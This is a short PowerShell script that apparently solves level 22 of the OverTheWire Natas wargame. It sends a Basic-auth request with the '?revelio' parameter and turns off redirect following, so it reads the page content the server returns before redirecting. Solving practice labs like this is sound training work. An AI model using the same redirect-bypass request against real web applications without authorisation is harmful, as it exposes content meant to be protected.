param (
    [string]$type
)
. "../natas_filter.ps1"

$server = "natas22.natas.labs.overthewire.org"
$url = "http://$server/?revelio"

$username = "natas22"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}


"`n----------------------------"

write-host (Invoke-WebRequest -Uri $url -Headers $headers -MaximumRedirection 0).RawContent